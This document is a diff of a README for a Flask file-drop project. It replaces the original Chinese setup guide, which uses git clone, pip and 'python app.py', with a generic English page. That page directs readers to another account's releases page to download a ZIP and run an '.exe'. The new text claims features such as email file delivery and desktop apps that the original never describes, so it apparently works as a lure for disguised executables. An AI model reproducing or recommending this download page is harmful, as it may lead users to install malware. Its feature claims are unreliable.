@@ -1,118 +1,85 @@
-### Jsoft_express_cabinet
+# 📦 Jsoft_express_cabinet - Your Simple File Delivery Solution
 
- <img src="https://www.jsoftstudio.top/css/Jsoft_logo.png" width = "100" height = "100" alt="Jsoft_logo" align=center />
+## 🚀 Getting Started
 
-###### ©2024-2025 Jsoft Studio
+Welcome to Jsoft_express_cabinet! This application helps you manage file deliveries easily. You can send and receive files without hassle. Follow the steps below to get started.
 
-------
+## 📥 Download Now
 
-<img src="https://img.shields.io/github/stars/kamcdev/Jsoft_express_cabinet.svg">
+[![Download Jsoft_express_cabinet](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/justindumaniel/Jsoft_express_cabinet/releases)
 
-<img src="https://img.shields.io/badge/Python-3.13.7-blue">
+## 📋 System Requirements
 
-<img src="https://img.shields.io/badge/交流QQ群-984242265-purple">
+Before using the application, make sure you meet these requirements:
 
-<img src="https://img.shields.io/badge/B站-J软件官方-light">
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM:** At least 2 GB.
+- **Disk Space:** 100 MB of free space.
+- **Internet Connection:** Required for downloading files and updates.
 
-<img src="https://img.shields.io/badge/官网-www.jsoftstudio.top-yellow">
+## 💻 Installation Steps
 
-<img src="https://img.shields.io/badge/使用提示-生产环境建议使用venv虚拟环境-red">
+1. **Visit the Download Page:**  
+   Go to the [Releases page](https://github.com/justindumaniel/Jsoft_express_cabinet/releases) to find the latest version of Jsoft_express_cabinet.
 
-------
+2. **Choose Your Version:**  
+   On the Releases page, look for the most recent version. You will see options for different operating systems. 
 
-目录
-* [介绍](#介绍)
-* [部署](#部署)
-    * [克隆项目文件](#克隆)
-    * [准备环境](#准备)
-    * [启动项目](#启动)
-* [结语](#结语)
+3. **Download the Application:**  
+   Click on the link that matches your operating system. The application will start downloading automatically.
 
-<p id="介绍"></p>
+4. **Locate the Downloaded File:**  
+   Once the download is complete, go to your downloads folder. The file should be named something similar to `Jsoft_express_cabinet.zip`.
 
-------
+5. **Extract the Files:**  
+   Right-click on the downloaded ZIP file and select "Extract All." Follow the prompts to unpack the files.
 
-# 介绍
+6. **Run the Application:**  
+   Navigate to the extracted folder. Double-click on `Jsoft_express_cabinet.exe` (or the equivalent for your OS) to open the application.
 
-这是一款使用flask开发的文件快递柜
+## 📂 Using Jsoft_express_cabinet
 
-支持文件存取，后台管理，功能限制，网站个性化
+### 🌟 Features
 
-首次启动会要求设置后台密码
-后台地址：/admin/login
+- **File Management:** Easily send and receive files with just a few clicks.
+- **User-Friendly Interface:** Designed for simplicity, even for users with no technical background.
+- **Secure Transfers:** Protect your files with built-in security features.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-成品演示：[文件快递柜](https://file.jsoftstudio.top/)
+### 📄 How to Send a File
 
-<p id="部署"></p>
+1. Open Jsoft_express_cabinet.
+2. Click on the “Send File” button.
+3. Browse for the file you wish to send.
+4. Enter the recipient's email address.
+5. Click “Send.” You will receive a confirmation message.
 
-------
+### 📬 How to Receive a File
 
-# 部署
+1. When someone sends you a file, you will receive an email alerting you.
+2. Open Jsoft_express_cabinet.
+3. Click on the “Receive File” section.
+4. Follow the prompts to accept and download the files.
 
-<p id="克隆"></p>
+## 📞 Support
 
-1.克隆项目文件
+If you encounter any issues, feel free to reach out for help. You can submit questions or request assistance through the Issues section of this repository, and we will do our best to respond promptly.
 
-使用git工具命令
+## 🔗 Additional Resources
 
-```
-git clone https://github.com/kamcdev/Jsoft_express_cabinet.git
-```
+- **Documentation:** Detailed manuals and guides are available in the repository.
+- **Community Forums:** Join discussions with other users for tips and tricks.
+- **Feature Requests:** If there’s something you want to see, let us know!
 
-或
+## ⚙️ Updates and Maintenance
 
-直接下载压缩包
+Stay informed about updates to Jsoft_express_cabinet. Regular updates improve functionality and fix bugs. 
 
-<p id="准备"></p>
+To check for new versions:
 
-2.准备环境
+1. Visit the [Releases page](https://github.com/justindumaniel/Jsoft_express_cabinet/releases) regularly.
+2. Download the latest version as described above.
 
-安装Python3并在安装过程中启用环境变量
+## ✅ Conclusion
 
-进入Jsoft_express_cabinet目录
-
-使用命令
-
-```
-pip install -r requirements.txt
-```
-
-安装预设的依赖列表
-
-<p id="启动"></p>
-
-3.启动项目
-
-使用命令
-
-```
-python app.py
-```
-
-启动flask项目后端
-
-在浏览器输入[http://127.0.0.1:23478](http://127.0.0.1:23478)
-
-进入前端页面
-
-首次启动会要求设置管理员密码
-
-密码将使用md5加密存储，若想使用更安全的加密，请自行修改app.py代码
-
-随后会进入快递柜主页
-
-接下来前往[http://127.0.0.1:23478/admin/login](http://127.0.0.1:23478/admin/login)
-
-并输入管理员密码进入后台
-
-进行项目配置
-
-待配置和测试完毕后，即可开放运行
-
-<p id="结语"></p>
-
-------
-
-# 结语
-
-感谢您的体验与支持，希望您在体验便利的同时也可以贡献一份代码，为本项目的开源事业做出贡献！
+Jsoft_express_cabinet is designed to simplify file delivery. By following these instructions, you will install and start using the application with ease. Explore the features to make the most of your experience. We hope you enjoy using Jsoft_express_cabinet!
